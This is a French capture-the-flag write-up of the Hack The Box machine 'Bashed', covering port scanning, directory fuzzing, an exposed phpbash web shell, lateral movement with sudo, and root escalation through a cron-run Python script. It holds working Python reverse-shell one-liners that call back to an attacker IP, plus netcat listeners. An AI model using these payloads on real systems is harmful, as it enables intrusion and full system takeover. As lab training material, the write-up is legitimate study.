---
tags:
  - htb
  - web
  - enum
  - privesc
  - misconfig
title: Bashed
os: Linux
difficulty: Easy
date: 2025-11-16
status: terminé
draft: "false"
---
---
# Bashed

> [!summary] Résumé rapide  
> Bashed est une machine Facile de Hack The Box. Un serveur web tourne avec un script php dangereux qui donne un accès direct à un shell utilisateur une fois qu'il est trouvé. Une fois sur la machine, un attaquant peut pivoter directement vers un second utilisateur afin de modifier un script exécuté périodiquement par root. Ce comportement permet alors d'obtenir un shell root en réécrivant le script. 

---

## 🟦 Informations générales

- **Nom de la machine :** Bashed
- **OS :** Linux
- **Difficulty :** Easy
- **Auteur :** Arrexel
- **Date :** 16/11/2025
- **Statut :** Terminée

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.57.23 --min-rate 5000
```

**Services découverts :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 23:59 CET
Nmap scan report for 10.129.57.23
Host is up (0.051s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.99 seconds
```


> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p80 10.129.57.23
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 00:00 CET 
Nmap scan report for 10.129.57.23
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
```

---
## 🟦 2. Analyse des services

Le site semble être un blog d'un développeur/pentesteur

![[Pasted image 20251116000413.png]]

Dans le menu on note la mention "Colorlib" :

![[Pasted image 20251116000731.png]]

Peut-être une techno Wordpress sous-jacente.

Le blog contient des informations à propos d'un outils nommé "phpbash" qui permet d'utiliser un reverse shell PHP depuis un navigateur quand le port SSH est inaccessible.

https://github.com/Arrexel/phpbash

### 🌐 HTTP / Web
**Technos détectées :**  
-  Apache/2.4.18

**Endpoints trouvés :**

> [!info] Fuzzing

```bash
gobuster dir -w ~/Pentest/Wordlists/dirb/common.txt -u http://bashed.htb/
```

```bash
/.hta                 (Status: 403) [Size: 289]
/.htaccess            (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 294]
/css                  (Status: 301) [Size: 306] [--> http://bashed.htb/css/]
/dev                  (Status: 301) [Size: 306] [--> http://bashed.htb/dev/]
/fonts                (Status: 301) [Size: 308] [--> http://bashed.htb/fonts/]
/images               (Status: 301) [Size: 309] [--> http://bashed.htb/images/]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 305] [--> http://bashed.htb/js/]
/php                  (Status: 301) [Size: 306] [--> http://bashed.htb/php/]
/server-status        (Status: 403) [Size: 298]
/uploads              (Status: 301) [Size: 310] [--> http://bashed.htb/uploads/]
Progress: 4613 / 4613 (100.00%)
```

On note les endpoints intéressants suivants :
- /dev => contient le script phpbash.php
- /php => contient un script sendMail.php
- /uploads => vide, contient peut-être des fichiers supplémentaires

---
## 🟦 3. Points d’entrée potentiels

-  Le script phpbash.php semble être tout donné pour se connecter à la machine

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

On se dirige juste sur http://bashed.htb/dev/phpbash.php

**Résultat :**  On a un reverse shell sur bashed.htb.

On peut Stabiliser le shell en créant une connexion via netcat :
Côté attaquant :
```bash
nc -lnvp 1337
```

Côté serveur :
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Accès obtenu :**  
- User :  www-data
- Contexte :  shell

---

## 🟦 5. Post-exploitation / Énumération locale

**Enumération des utilisateurs**

```bash
cat /etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash
--
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash  
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

Il y a donc 3 utilisateurs sur la machine : `root`, `arrexel` et `scriptmanager`.

On a accès au flag utilisateur dans `/home/arrexel`.

### 5.1 Mouvement latéral

#### Exploration du fichier /var/www

On peut accéder au dossier `/var/www/html/php` pour lire le contenu du fichier `sendMail.php`

```bash
ls -la
```

```bash
total 12  
drw-r-xr-x 2 root root 4096 Jun 2 2022 .  
drw-r-xr-x 10 root root 4096 Jun 2 2022 ..  
-rw-r-xr-x 1 root root 1652 Dec 4 2017 sendMail.php
```

On remarque que le script tente d'inclure un fichier de config :
```php
include_once (dirname(dirname(__FILE__)) . '/config.php');
```

Le fichier de config se trouve dans `/var/www/html/config.php` :

```php
<?php

//SITE GLOBAL CONFIGURATION  
$email = "yourmail@here.com"; //<-- Your email  
  
?>
```

Mais la piste semble s'arrêter ici.

#### Vérifications commandes sudo

L'utilisateur `www-data` peut exécuter des commandes en tant que `scriptmanager` sans mot de passe :

```bash
sudo -l
```

```bash
Matching Defaults entries for www-data on bashed:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

```bash
sudo -u scriptmanager whoami
scriptmanager
```

On peut donc devenir `scriptmanager` avec la commande suivante :
```bash
sudo -u scriptmanager bash -i
```

L'utilisateur `scriptmanager` a un accès à `/scripts` que `www-data` n'a pas :

```bash
ls -l /scripts
```

```bash
total 8  
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py  
-rw-r--r-- 1 root root 12 Nov 16 01:02 test.txt
```

Le contenu de script.py :
```python
f = open("test.txt", "w")  
f.write("testing 123!")  
f.close
```

Hypothèse : Si l'utilisateur root exécute périodiquement le script `test.py`, on pourrait obtenir un shell root.

On peut confirmer l'hypothèse en modifiant le script Python en remplaçant "testing 123!" par une autre chaîne : root exécute le script toutes les minutes.

---

## 🟦 6. Élévation de privilèges

### Méthode retenue :

Remplacement du script test.py par :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

et côté attaquant :
```bash
nc -lnvp 31337
```

- Type :  Reverse Shell
- Pourquoi ça marche :  root exécute un fichier que nous pouvons écrire.

**Contexte final :** root shell

---

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Création de reverse shell avec `netcat`
-  Énumération sous Linux
-  Mouvement latéral
-  Recherche de dossier et scripts non standards sur le système

> [!failure] Ce que j’ai raté / À éviter  
-  Passer trop de temps à essayer de trouver un crontab alors qu'un test suffit parfois à valider une hypothèse.

> [!attention] Patterns utiles  
-  Commande `sudo -l` pour voir les commandes exécutables potentiellement sans mot de passe